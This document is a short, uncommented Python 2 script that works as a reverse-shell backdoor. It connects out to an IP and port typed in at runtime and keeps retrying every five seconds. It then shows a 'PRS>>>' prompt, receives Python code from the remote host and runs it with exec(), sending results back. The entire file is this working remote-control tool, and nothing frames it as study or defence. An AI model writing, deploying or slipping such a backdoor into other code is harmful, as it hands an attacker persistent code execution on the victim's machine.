import socket
import time

IP, PORT = raw_input("IP: "), int(raw_input("PORT: "))
while True:
    s = socket.socket()
    try:
        s.connect((IP, PORT))
    except:
        time.sleep(5)
        continue
    s.send("PRS>>> ")
    toExecute = ""
    indent = 0
    while True:
        output = ""
        data = s.recv(1024)
        if not data:
            s.close()
            break
        if "clearVariable" in data: 
            s.send("cleared")
            toExecute = ""
            continue
        try:
            if ":" in data:
                indent += 1
            elif not data.startswith(" "*indent*4):
                indent -= 1
            toExecute += data + "\n"
            if not indent:
                exec(toExecute)
            s.send(str(output)+"\nPRS>>> ")
            
        except Exception, e:
            print e
            indent = 0
            toExecute = "" 
